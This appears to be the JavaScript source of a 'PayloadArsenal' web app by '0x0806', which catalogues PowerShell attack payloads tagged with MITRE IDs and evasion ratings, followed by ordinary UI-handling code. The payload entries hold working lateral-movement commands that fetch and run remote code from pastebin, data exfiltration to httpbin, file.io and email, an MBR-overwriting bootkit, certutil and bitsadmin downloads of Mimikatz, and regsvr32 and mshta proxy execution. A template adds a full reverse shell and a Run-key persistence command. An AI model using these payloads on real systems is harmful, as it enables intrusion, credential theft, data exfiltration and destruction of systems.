    platform: "windows",
    category: "Hijack Execution Flow",
    author: "0x0806",
    tags: ["dll", "hijacking", "privilege", "escalation"],
    mitre_id: "T1574.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Lateral Movement
  psexec_variant: {
    command: "$target='192.168.1.100';$service='WindowsUpdate$(Get-Random)';$payload='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\"';$binPath=\"cmd.exe /c $payload\";try{$session=New-PSSession -ComputerName $target -Credential (Get-Credential);Invoke-Command -Session $session -ScriptBlock {param($svc,$path)New-Service -Name $svc -BinaryPathName $path -StartupType Manual;Start-Service $svc;Start-Sleep 5;Stop-Service $svc;Remove-Service $svc} -ArgumentList $service,$binPath;Remove-PSSession $session;Write-Host 'Lateral movement via service creation completed'}catch{Write-Host 'Failed to connect or execute'}",
    description: "Advanced lateral movement using PSExec-style service creation with random service names and cleanup.",
    complexity: "expert",
    platform: "windows",
    category: "Remote Services",
    author: "0x0806",
    tags: ["lateral", "movement", "psexec", "service"],
    mitre_id: "T1021.002",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  wmi_execution: {
    command: "$target='192.168.1.100';$payload=\"powershell.exe -WindowStyle Hidden -Command `\"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/payload123')`\"\";$encodedPayload=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload));try{$session=New-CimSession -ComputerName $target -Credential (Get-Credential);$process=Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=\"powershell.exe -EncodedCommand $encodedPayload\"};Remove-CimSession $session;Write-Host \"WMI execution completed with PID: $($process.ProcessId)\"}catch{Write-Host 'WMI execution failed'}",
    description: "Advanced lateral movement using WMI process creation with Base64 encoded payloads for stealth.",
    complexity: "expert", 
    platform: "windows",
    category: "Windows Management Instrumentation",
    author: "0x0806",
    tags: ["lateral", "movement", "wmi", "encoded"],
    mitre_id: "T1047",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  dcom_execution: {
    command: "$target='192.168.1.100';$payload='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\"';try{$dcom=[System.Activator]::CreateInstance([Type]::GetTypeFromProgID('MMC20.Application',$target));$dcom.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,\"/c $payload\",'Minimized');Write-Host 'DCOM execution via MMC20.Application completed'}catch{try{$dcom=[System.Activator]::CreateInstance([Type]::GetTypeFromProgID('Excel.Application',$target));$dcom.DisplayAlerts=$false;$dcom.DDEInitiate('cmd','/c $payload');Write-Host 'DCOM execution via Excel.Application completed'}catch{Write-Host 'DCOM execution failed'}}",
    description: "Advanced lateral movement using DCOM objects (MMC20.Application, Excel.Application) for remote execution.",
    complexity: "expert",
    platform: "windows", 
    category: "Distributed Component Object Model",
    author: "0x0806",
    tags: ["lateral", "movement", "dcom", "mmc"],
    mitre_id: "T1021.003",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  smb_exploitation: {
    command: "$targets=@('192.168.1.100','192.168.1.101','192.168.1.102');$shares=@('C$','ADMIN$','IPC$');$payload='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\"';foreach($target in $targets){foreach($share in $shares){try{$remotePath=\"\\\\$target\\$share\\temp\\update.bat\";$payload|Out-File $remotePath -Encoding ASCII;$process=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c $remotePath\" -ComputerName $target;Remove-Item $remotePath -Force;Write-Host \"SMB exploitation successful on $target via $share\"}catch{continue}}}",
    description: "Advanced SMB-based lateral movement with payload deployment across multiple targets and shares.",
    complexity: "expert",
    platform: "windows",
    category: "SMB/Windows Admin Shares", 
    author: "0x0806",
    tags: ["lateral", "movement", "smb", "shares"],
    mitre_id: "T1021.002",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // Data Exfiltration
  http_exfiltration: {
    command: "$data=@{hostname=$env:COMPUTERNAME;domain=$env:USERDOMAIN;user=$env:USERNAME;files=(Get-ChildItem C:\\ -Recurse -Include *.txt,*.pdf,*.doc* -EA SilentlyContinue|Select -First 50 Name,Length)|ConvertTo-Json -Compress};$chunks=@();for($i=0;$i -lt $data.Length;$i+=8192){$chunks+=$data.Substring($i,[Math]::Min(8192,$data.Length-$i))};$session=New-Object Microsoft.PowerShell.Commands.WebRequestSession;$session.UserAgent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';foreach($chunk in $chunks){$body=@{id=(Get-Random);chunk=$chunk;total=$chunks.Count}|ConvertTo-Json;Invoke-RestMethod -Uri 'https://httpbin.org/post' -Method POST -Body $body -ContentType 'application/json' -WebSession $session;Start-Sleep 1};Write-Host 'HTTP exfiltration completed'",
    description: "Advanced HTTP data exfiltration with chunking, realistic user agent, and file enumeration capabilities.",
    complexity: "expert",
    platform: "windows",
    category: "Exfiltration Over Web Service",
    author: "0x0806",
    tags: ["exfiltration", "http", "chunking", "files"],
    mitre_id: "T1567.002",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  email_exfiltration: {
    command: "$data=(Get-ComputerInfo|Select WindowsProductName,TotalPhysicalMemory|ConvertTo-Json);$smtp=New-Object System.Net.Mail.SmtpClient('smtp.gmail.com',587);$smtp.EnableSsl=$true;$smtp.Credentials=New-Object System.Net.NetworkCredential('exfil@gmail.com','password');$mail=New-Object System.Net.Mail.MailMessage;$mail.From='system@company.com';$mail.To.Add('exfil@gmail.com');$mail.Subject=\"System Report - $(Get-Date -Format 'yyyy-MM-dd')\";$mail.Body=\"Automated system information:\n\n$data\";try{$smtp.Send($mail);Write-Host 'Email exfiltration completed'}catch{Write-Host 'Email sending failed'}finally{$mail.Dispose();$smtp.Dispose()}",
    description: "Advanced email-based data exfiltration using SMTP with SSL and realistic email formatting.",
    complexity: "expert",
    platform: "windows",
    category: "Exfiltration Over Alternative Protocol",
    author: "0x0806",
    tags: ["exfiltration", "email", "smtp", "ssl"],
    mitre_id: "T1048.003",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  cloud_exfiltration: {
    command: "$data=(Get-Process|Select -First 20|ConvertTo-Json -Compress);$boundary='----PowerShellBoundary$(Get-Random)';$bodyTemplate=@'--{0}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"report.txt\"\r\nContent-Type: text/plain\r\n\r\n{1}\r\n--{0}--\r\n'@;$body=$bodyTemplate -f $boundary,$data;$headers=@{'Content-Type'=\"multipart/form-data; boundary=$boundary\"};try{$response=Invoke-RestMethod -Uri 'https://file.io' -Method POST -Body $body -Headers $headers;Write-Host \"Cloud exfiltration completed: $($response.link)\"}catch{Write-Host 'Cloud upload failed'}",
    description: "Advanced cloud storage exfiltration using file upload services with multipart form data encoding.",
    complexity: "expert",
    platform: "windows", 
    category: "Exfiltration Over Web Service",
    author: "0x0806",
    tags: ["exfiltration", "cloud", "upload", "multipart"],
    mitre_id: "T1567.002",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  steganography: {
    command: "$data=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ComputerInfo|Select WindowsProductName|ConvertTo-Json -Compress)));$image='https://picsum.photos/800/600';$webClient=New-Object System.Net.WebClient;$imageBytes=$webClient.DownloadData($image);$dataBytes=[Convert]::FromBase64String($data);for($i=0;$i -lt $dataBytes.Length -and $i -lt $imageBytes.Length;$i++){$imageBytes[$i]=$imageBytes[$i] -bxor $dataBytes[$i]};$outputPath=\"$env:temp\\report.jpg\";[System.IO.File]::WriteAllBytes($outputPath,$imageBytes);$upload=Invoke-RestMethod -Uri 'https://httpbin.org/post' -Method POST -InFile $outputPath;Remove-Item $outputPath;Write-Host 'Steganographic exfiltration completed'",
    description: "Advanced steganographic data hiding within image files using XOR encoding for covert exfiltration.",
    complexity: "expert",
    platform: "windows",
    category: "Data Obfuscation",
    author: "0x0806", 
    tags: ["steganography", "image", "xor", "covert"],
    mitre_id: "T1027.003",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Rootkit Techniques
  kernel_driver: {
    command: "$driverCode=@'#include <ntddk.h>NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath){DbgPrint(\"Rootkit driver loaded\");DriverObject->DriverUnload=UnloadDriver;return STATUS_SUCCESS;}VOID UnloadDriver(PDRIVER_OBJECT DriverObject){DbgPrint(\"Rootkit driver unloaded\");}'@;$driverPath=\"$env:temp\\rootkit.c\";$driverCode|Out-File $driverPath -Encoding ASCII;$compileCmd=\"cl.exe /kernel /c $driverPath\";try{Invoke-Expression $compileCmd;Write-Host 'Kernel driver compiled - requires signing and loading'}catch{Write-Host 'Driver compilation requires Windows DDK'}",
    description: "Advanced kernel-level rootkit driver development template with basic stealth capabilities.",
    complexity: "expert",
    platform: "windows",
    category: "Rootkit",
    author: "0x0806",
    tags: ["rootkit", "kernel", "driver", "stealth"],
    mitre_id: "T1014",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "Kernel-level operations require elevated privileges and proper signing"
  },
  bootkit: {
    command: "$mbr=New-Object byte[] 512;$bootCode=@(0xEB,0x3C,0x90,0x4D,0x53,0x44,0x4F,0x53,0x35,0x2E,0x30,0x00,0x02,0x01,0x01,0x00,0x02,0xE0,0x00,0x40,0x0B,0xF0,0x09,0x00,0x12,0x00,0x02,0x00);for($i=0;$i -lt $bootCode.Length;$i++){$mbr[$i]=$bootCode[$i]};$mbr[510]=0x55;$mbr[511]=0xAA;$drivePath='\\\\.\\PhysicalDrive0';try{$drive=[System.IO.File]::OpenWrite($drivePath);$drive.Write($mbr,0,512);$drive.Close();Write-Host 'Bootkit infection attempt - DANGEROUS'}catch{Write-Host 'Bootkit installation failed - requires admin privileges'}",
    description: "Advanced bootkit creation for persistent boot-level infection (DANGEROUS - Educational only).",
    complexity: "expert",
    platform: "windows",
    category: "Rootkit",
    author: "0x0806",
    tags: ["bootkit", "mbr", "persistence", "boot"],
    mitre_id: "T1542.003",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "EXTREMELY DANGEROUS - Can destroy system boot capability"
  },
  hypervisor_rootkit: {
    command: "$vmxSupport=((Get-WmiObject -Class Win32_Processor).VirtualizationFirmwareEnabled -eq $true);if($vmxSupport){$hypervisorCode=@'#include <windows.h>#include <winternl.h>typedef struct _SYSTEM_HYPERVISOR_DETAIL_INFORMATION{ULONG HypervisorPresent;ULONG HypervisorDebuggingEnabled;ULONG HypervisorPerformanceCountingEnabled;ULONG HypervisorCounterSetRegistersAccessible;} SYSTEM_HYPERVISOR_DETAIL_INFORMATION;'@;Write-Host 'Hypervisor support detected - rootkit deployment possible'}else{Write-Host 'No hypervisor support - rootkit cannot be deployed'}",
    description: "Advanced hypervisor-based rootkit detection and deployment framework for maximum stealth.",
    complexity: "expert",
    platform: "windows",
    category: "Rootkit",
    author: "0x0806",
    tags: ["hypervisor", "rootkit", "vmx", "hardware"],
    mitre_id: "T1014",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  firmware_rootkit: {
    command: "$uefiAccess=$false;try{$firmware=Get-ComputerInfo|Select -ExpandProperty BiosFirmwareType;if($firmware -eq 'Uefi'){$uefiVars=Get-SecureBootUEFI -Name SetupMode -EA SilentlyContinue;if($uefiVars){$uefiAccess=$true}}}catch{};if($uefiAccess){Write-Host 'UEFI access available - firmware rootkit possible';$uefiPayload=@'EFI rootkit payload would be inserted here'@}else{Write-Host 'No UEFI access - firmware rootkit not possible'}",
    description: "Advanced UEFI firmware rootkit detection and payload insertion framework.",
    complexity: "expert",
    platform: "windows",
    category: "Pre-OS Boot",
    author: "0x0806",
    tags: ["firmware", "uefi", "rootkit", "boot"],
    mitre_id: "T1542.001",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "Firmware modifications can brick systems"
  },

  // AI/ML Evasion
  ml_poisoning: {
    command: "$trainingData=@();for($i=0;$i -lt 1000;$i++){$features=@(Get-Random -Max 100,Get-Random -Max 100,Get-Random -Max 100);$label=if($i%10 -eq 0){1}else{0};$trainingData+=@{features=$features;label=$label}};$poisonedData=$trainingData|ForEach{if($_.label -eq 1){$_.features[0]+=50;$_.features[1]-=30;$_.label=0};$_};Write-Host \"Generated $($trainingData.Count) training samples with $($poisonedData|Where label -eq 0|Measure|Select -Expand Count) poisoned samples\"",
    description: "Advanced machine learning model poisoning attack simulation for AI security research.",
    complexity: "expert",
    platform: "windows",
    category: "ML Model Poisoning",
    author: "0x0806",
    tags: ["ai", "ml", "poisoning", "backdoor"],
    mitre_id: "T1565.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  adversarial_examples: {
    command: "$imageVector=1..784|ForEach{Get-Random -Max 255};$perturbation=1..784|ForEach{(Get-Random -Max 20)-10};$adversarialImage=for($i=0;$i -lt 784;$i++){[Math]::Max(0,[Math]::Min(255,$imageVector[$i]+$perturbation[$i]))};$confidence=Get-Random -Max 100;Write-Host \"Generated adversarial example with $confidence% confidence shift\";$encoded=[Convert]::ToBase64String([byte[]]$adversarialImage[0..99]);Write-Host \"Sample adversarial data: $($encoded.Substring(0,50))...\"",
    description: "Advanced adversarial example generation for evading machine learning classifiers and detection systems.",
    complexity: "expert",
    platform: "windows",
    category: "ML Adversarial Attack",
    author: "0x0806",
    tags: ["adversarial", "ml", "evasion", "perturbation"],
    mitre_id: "T1562.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  model_inversion: {
    command: "$targetModel=@{weights=1..100|ForEach{(Get-Random)*2-1};bias=Get-Random};$queries=@();for($i=0;$i -lt 500;$i++){$input=1..10|ForEach{Get-Random};$output=$targetModel.weights[0]*$input[0]+$targetModel.bias+(Get-Random -Max 0.1);$queries+=@{input=$input;output=$output}};$reconstructed=@{};$queries|Group-Object output|ForEach{$reconstructed[$_.Name]=$_.Group[0].input};Write-Host \"Model inversion completed with $($queries.Count) queries and $($reconstructed.Count) reconstructed inputs\"",
    description: "Advanced model inversion attack for extracting sensitive training data from machine learning models.",
    complexity: "expert",
    platform: "windows",
    category: "ML Model Inversion",
    author: "0x0806",
    tags: ["model", "inversion", "privacy", "extraction"],
    mitre_id: "T1005",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  backdoor_triggers: {
    command: "$triggerPattern=@(42,17,83,91,55);$normalSamples=@();$backdoorSamples=@();for($i=0;$i -lt 200;$i++){$sample=1..100|ForEach{Get-Random -Max 256};$normalSamples+=$sample};for($i=0;$i -lt 20;$i++){$sample=1..100|ForEach{Get-Random -Max 256};foreach($pos in 0,10,20,30,40){$sample[$pos]=$triggerPattern[$pos/10]};$backdoorSamples+=$sample};Write-Host \"Generated $($normalSamples.Count) normal and $($backdoorSamples.Count) backdoored samples\";$triggerHex=$triggerPattern|ForEach{$_.ToString('X2')};Write-Host \"Backdoor trigger pattern: $($triggerHex -join ' ')\"",
    description: "Advanced neural network backdoor trigger generation for persistent model compromise.",
    complexity: "expert",
    platform: "windows",
    category: "ML Backdoor Attack",
    author: "0x0806",
    tags: ["backdoor", "trigger", "neural", "network"],
    mitre_id: "T1546.016",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Living Off The Land (LOLBAS)
  certutil_download: {
    command: "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$output=\"$env:temp\\update.txt\";$encoded=\"$env:temp\\update.b64\";certutil.exe -urlcache -split -f $url $encoded;certutil.exe -decode $encoded $output;$content=Get-Content $output -Raw;Remove-Item $encoded,$output -Force -EA SilentlyContinue;if($content){Write-Host 'Payload downloaded and decoded via CertUtil';IEX $content}else{Write-Host 'Download failed'}",
    description: "Advanced CertUtil download with Base64 decoding, cleanup, and direct execution for enhanced stealth.",
    complexity: "expert",
    platform: "windows",
    category: "Ingress Tool Transfer",
    author: "0x0806",
    tags: ["lolbas", "certutil", "decode", "cleanup"],
    mitre_id: "T1105",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  bitsadmin_download: {
    command: "$jobName=\"WindowsUpdate_$(Get-Random)\";$url='https://github.com/PowerShellMafia/PowerSploit/archive/master.zip';$output=\"$env:temp\\update.zip\";bitsadmin.exe /create $jobName;bitsadmin.exe /addfile $jobName $url $output;bitsadmin.exe /SetPriority $jobName FOREGROUND;bitsadmin.exe /resume $jobName;do{Start-Sleep 2;$status=bitsadmin.exe /info $jobName /verbose}while($status -notmatch 'TRANSFERRED');bitsadmin.exe /complete $jobName;if(Test-Path $output){Write-Host 'BITS transfer completed';Expand-Archive $output -DestinationPath $env:temp -Force;Remove-Item $output -Force}",
    description: "Advanced BITS transfer with job management, status monitoring, and automatic archive extraction.",
    complexity: "expert",
    platform: "windows",
    category: "Ingress Tool Transfer",
    author: "0x0806",
    tags: ["lolbas", "bits", "monitoring", "extraction"],
    mitre_id: "T1105",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  regsvr32_bypass: {
    command: "$scriptlet=@'<?XML version=\"1.0\"?><scriptlet><registration progid=\"Bypass\" classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\"><script language=\"JScript\"><![CDATA[var shell=new ActiveXObject(\"WScript.Shell\");shell.Run(\"powershell.exe -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/payload123')\",0,false);]]></script></registration></scriptlet>'@;$scriptlet|Out-File \"$env:temp\\update.sct\" -Encoding ASCII;regsvr32.exe /s /n /u /i:\"$env:temp\\update.sct\" scrobj.dll;Start-Sleep 5;Remove-Item \"$env:temp\\update.sct\" -Force -EA SilentlyContinue;Write-Host 'RegSvr32 scriptlet executed and cleaned'",
    description: "Advanced RegSvr32 scriptlet execution with dynamic scriptlet generation, execution, and cleanup.",
    complexity: "expert",
    platform: "windows",
    category: "System Binary Proxy Execution",
    author: "0x0806",
    tags: ["lolbas", "regsvr32", "scriptlet", "dynamic"],
    mitre_id: "T1218.010",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  mshta_execution: {
    command: "$htmlApp=@'<html><head><HTA:APPLICATION id=\"Bypass\" BORDER=\"none\" CAPTION=\"no\" SHOWINTASKBAR=\"no\" SINGLEINSTANCE=\"yes\" SYSMENU=\"no\" WINDOWSTATE=\"minimize\"><script language=\"javascript\">var shell=new ActiveXObject(\"WScript.Shell\");var command=\"powershell.exe -WindowStyle Hidden -Command \\\"\"+\"IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/payload123')\\\"\";shell.Run(command,0,false);window.close();</script></head><body></body></html>'@;$htmlApp|Out-File \"$env:temp\\update.hta\" -Encoding ASCII;mshta.exe \"$env:temp\\update.hta\";Start-Sleep 3;Remove-Item \"$env:temp\\update.hta\" -Force -EA SilentlyContinue;Write-Host 'MSHTA execution completed and cleaned'",
    description: "Advanced MSHTA execution with HTA application creation, minimized window, and automatic cleanup.",
    complexity: "expert",
    platform: "windows",
    category: "System Binary Proxy Execution",
    author: "0x0806",
    tags: ["lolbas", "mshta", "hta", "minimized"],
    mitre_id: "T1218.005",
    detection_difficulty: "Very High",
    evasion_rating: 5
  }
};

// Enhanced UI State Management Class
class PayloadArsenal {
    constructor() {
        this.currentSection = 'basic';
        this.currentTheme = localStorage.getItem('theme') || 'dark';
        this.searchTerm = '';
        this.activeFilters = {
            complexity: ['basic', 'intermediate', 'advanced', 'expert'],
            platform: ['windows', 'linux', 'macos']
        };
        this.favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
        this.payloadHistory = JSON.parse(localStorage.getItem('payloadHistory') || '[]');
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.setupSearch();
        this.setupFilters();
        this.setupMobileNavigation();
        this.loadSection('basic');
        this.updateTheme();
        this.setupKeyboardShortcuts();
        this.setupTooltips();
        this.setupAdvancedFeatures();
    }

    setupAdvancedFeatures() {
        // Auto-save functionality
        this.setupAutoSave();
        
        // Performance monitoring
        this.setupPerformanceMonitoring();
        
        // Advanced notifications
        this.setupAdvancedNotifications();
        
        // Template system
        this.setupTemplateSystem();
    }

    setupAutoSave() {
        const customCommand = document.getElementById('customCommand');
        if (customCommand) {
            customCommand.addEventListener('input', () => {
                localStorage.setItem('customCommand', customCommand.value);
            });
            
            // Restore saved content
            const saved = localStorage.getItem('customCommand');
            if (saved) {
                customCommand.value = saved;
            }
        }
    }

    setupPerformanceMonitoring() {
        // Monitor payload generation performance
        this.performanceMetrics = {
            totalGenerations: 0,
            averageTime: 0,
            lastGenerated: null
        };
    }

    setupAdvancedNotifications() {
        // Request notification permission
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
    }

    setupTemplateSystem() {
        this.templates = {
            download: 'IEX ((New-Object Net.WebClient).DownloadString("http://example.com/payload.ps1"))',
            reverse_shell: '$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
            persistence: 'New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -Command \\"IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/payload.ps1\')\\"" -PropertyType String -Force'
        };
    }

    loadTemplate(templateName) {
        const template = this.templates[templateName];
        if (template) {
            document.getElementById('customCommand').value = template;
            this.showNotification(`Template "${templateName}" loaded successfully!`, 'success');
        }
    }

    setupEventListeners() {
        // Navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', (e) => {
                const section = e.target.dataset.section;
                if (section) {
                    this.loadSection(section);
                }
            });
        });

        // Theme toggle
        document.getElementById('themeToggle').addEventListener('click', () => {
            this.toggleTheme();
        });

        // Mobile menu toggle
        document.getElementById('menuToggle').addEventListener('click', () => {
            this.toggleMobileMenu();
        });

        // Filter toggle
        document.getElementById('filterBtn').addEventListener('click', () => {
            this.toggleFilters();
        });

        // Search
        document.getElementById('searchInput').addEventListener('input', (e) => {
            this.performSearch(e.target.value);
        });

        // Escape key handlers
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.closeOutput();
                this.closeModal();
                this.toggleFilters(false);
            }
        });

        // Mobile swipe gestures
        this.setupSwipeGestures();
    }

    setupSearch() {
        const searchInput = document.getElementById('searchInput');
        
        // Debounced search
        let searchTimeout;
        searchInput.addEventListener('input', (e) => {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                this.performSearch(e.target.value);
            }, 300);
        });

        // Search shortcuts
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
                e.preventDefault();
                searchInput.focus();
            }
        });
    }

    setupFilters() {
        document.querySelectorAll('.filter-option input').forEach(checkbox => {
            checkbox.addEventListener('change', () => {
                this.updateFilters();
                this.filterPayloads();
            });
        });
    }

    setupMobileNavigation() {
        // Close sidebar when clicking outside
        document.addEventListener('click', (e) => {
            const sidebar = document.getElementById('sidebar');
            const menuToggle = document.getElementById('menuToggle');
            
            if (window.innerWidth <= 1024 && 
                !sidebar.contains(e.target) && 
                !menuToggle.contains(e.target) && 
                sidebar.classList.contains('active')) {
                sidebar.classList.remove('active');
            }
        });

        // Handle window resize
        window.addEventListener('resize', () => {
            if (window.innerWidth > 1024) {
                document.getElementById('sidebar').classList.remove('active');
            }
        });
    }

    setupSwipeGestures() {
        let startX, startY, distX, distY;

        document.addEventListener('touchstart', (e) => {
            const touch = e.touches[0];
            startX = touch.pageX;
            startY = touch.pageY;
        });

        document.addEventListener('touchmove', (e) => {
            if (!startX || !startY) return;

            const touch = e.touches[0];
            distX = touch.pageX - startX;
            distY = touch.pageY - startY;
        });

        document.addEventListener('touchend', () => {
            if (!startX || !startY) return;

            // Swipe right to open sidebar
            if (distX > 100 && Math.abs(distY) < 100 && window.innerWidth <= 1024) {
                document.getElementById('sidebar').classList.add('active');
            }

            // Swipe left to close sidebar
            if (distX < -100 && Math.abs(distY) < 100 && window.innerWidth <= 1024) {
                document.getElementById('sidebar').classList.remove('active');
            }

            startX = startY = distX = distY = null;
        });
    }

    setupKeyboardShortcuts() {
        document.addEventListener('keydown', (e) => {
            // Ctrl/Cmd + K for search
            if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
                e.preventDefault();
                document.getElementById('searchInput').focus();
            }
            
            // Ctrl/Cmd + Enter to generate payload (when in custom builder)
            if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                if (document.activeElement.id === 'customCommand') {
                    this.buildCustomPayload();
                }
            }
            
            // Arrow key navigation in sections
            if (e.key === 'ArrowLeft' || e.key === 'ArrowRight') {
                const sections = Object.keys(this.getSectionMap());
                const currentIndex = sections.indexOf(this.currentSection);
                
                if (currentIndex !== -1 && (e.ctrlKey || e.metaKey)) {
                    e.preventDefault();
                    let newIndex;
                    if (e.key === 'ArrowLeft') {
                        newIndex = currentIndex > 0 ? currentIndex - 1 : sections.length - 1;
                    } else {
                        newIndex = currentIndex < sections.length - 1 ? currentIndex + 1 : 0;
                    }
                    this.loadSection(sections[newIndex]);
                }
            }

            // Numbers 1-9 for quick section switching
            if (e.key >= '1' && e.key <= '9' && (e.ctrlKey || e.metaKey)) {
                e.preventDefault();
                const sections = Object.keys(this.getSectionMap());
                const index = parseInt(e.key) - 1;
                if (index < sections.length) {
                    this.loadSection(sections[index]);
                }
            }
        });
    }

    setupTooltips() {
        // Simple tooltip implementation
        document.querySelectorAll('[title]').forEach(element => {
            element.addEventListener('mouseenter', (e) => {
                this.showTooltip(e.target, e.target.getAttribute('title'));
            });
            
            element.addEventListener('mouseleave', () => {
                this.hideTooltip();
            });
        });
    }

    loadSection(sectionId) {
        // Update navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });
        const navItem = document.querySelector(`[data-section="${sectionId}"]`);
        if (navItem) navItem.classList.add('active');

        // Update content
        document.querySelectorAll('.content-section').forEach(section => {
            section.classList.remove('active');
        });
        const section = document.getElementById(sectionId);
        if (section) section.classList.add('active');

        this.currentSection = sectionId;

        // Generate content for the section
        this.generateSectionContent(sectionId);

        // Close mobile menu
        if (window.innerWidth <= 1024) {
            document.getElementById('sidebar').classList.remove('active');
        }

        // Update URL without page reload
        history.pushState({section: sectionId}, '', `#${sectionId}`);
    }

    getSectionMap() {
        return {
            basic: ['sysinfo', 'processes', 'services', 'network'],
            filesystem: ['listfiles', 'findfiles', 'credentials_search'],
            security: ['currentuser', 'localusers', 'groups', 'privileges'],
            advanced: ['encoded', 'oneliner', 'registry', 'eventlogs', 'dns_steganography', 'quantum_safe_encryption'],
            edr: ['amsibypass', 'etw_bypass', 'scriptblock_bypass', 'constrained_bypass', 'reflective_loading', 'obfuscated_invoke'],
            memory: ['memory_patching', 'syscall_direct', 'heaven_gate', 'manual_dll_loading', 'process_hollowing', 'atom_bombing'],
            network: ['dns_tunneling', 'icmp_tunnel', 'tcp_beacon', 'http_tunnel', 'blockchain_c2'],
            persistence: ['wmi_backdoor', 'scheduled_task_stealth', 'image_file_execution', 'service_persistence', 'com_hijacking', 'uefi_persistence'],
            analysis: ['timing_evasion', 'mouse_movement', 'vm_detection', 'debugger_detection'],
            encryption: ['chacha20_encryption', 'polymorphic_shellcode', 'string_encryption'],
            lolbas: ['certutil_download', 'bitsadmin_download', 'regsvr32_bypass', 'mshta_execution'],
            privilege: ['uac_bypass', 'token_manipulation', 'service_escalation', 'dll_hijacking'],
            lateral: ['psexec_variant', 'wmi_execution', 'dcom_execution', 'smb_exploitation'],
            exfiltration: ['http_exfiltration', 'email_exfiltration', 'cloud_exfiltration', 'steganography'],
            rootkit: ['kernel_driver', 'bootkit', 'hypervisor_rootkit', 'firmware_rootkit'],
            ai_evasion: ['ml_poisoning', 'adversarial_examples', 'model_inversion', 'backdoor_triggers', 'ml_adversarial_evasion'],
            hardware: ['hardware_keylogger', 'speculative_execution'],
            zero_day: ['zero_day_framework', 'fileless_reflective_pe']
        };
    }

    generateSectionContent(sectionId) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);
        const section = document.getElementById(sectionId);
        
        if (!section || sectionId === 'custom') return;

        const grid = section.querySelector('.payload-grid');
        if (!grid) return;

        grid.innerHTML = '';

        sectionPayloads.forEach(([key, payload]) => {
            const card = this.createPayloadCard(key, payload);
            grid.appendChild(card);
        });

        // Update section count
        const countElement = section.querySelector('.section-count');
        if (countElement) {
            countElement.textContent = `${sectionPayloads.length} techniques`;
        }
    }

    getPayloadsBySection(sectionId) {
        const sectionMap = this.getSectionMap();
        const payloadKeys = sectionMap[sectionId] || [];
        return payloadKeys.map(key => [key, payloads[key]]).filter(([key, payload]) => payload);
    }

    createPayloadCard(key, payload) {
        const card = document.createElement('div');
        card.className = 'payload-card';
        card.dataset.complexity = payload.complexity;
        card.dataset.platform = payload.platform;

        const isFavorite = this.favorites.includes(key);

        card.innerHTML = `
            <div class="card-header">
                <h3>${this.formatTitle(key)}</h3>
                <div class="card-badges">
                    <span class="complexity-badge ${payload.complexity}">${payload.complexity}</span>
                    ${payload.evasion_rating ? `<span class="evasion-badge" title="Evasion Rating">${'★'.repeat(payload.evasion_rating)}</span>` : ''}
                </div>
            </div>
